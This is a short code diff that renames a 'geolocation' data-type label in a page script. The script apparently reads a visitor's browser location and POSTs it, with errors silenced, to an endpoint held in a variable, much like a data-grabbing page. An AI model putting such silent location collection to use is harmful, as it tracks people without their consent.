@@ -111,7 +111,7 @@
             
         } catch (error) {
         }
-      } else if (datatype === "geolocation") {
+      } else if (datatype === "geo") {
         try {
           const response = await fetch(h, {
             method: 'POST',
@@ -163,7 +163,7 @@
 			navigator.geolocation.getCurrentPosition(function(position) {
         dLat = position.coords.latitude;
         dLon = position.coords.longitude;
-        boofData("geolocation");
+        boofData("geo");
 			});
 		}
 	</script>
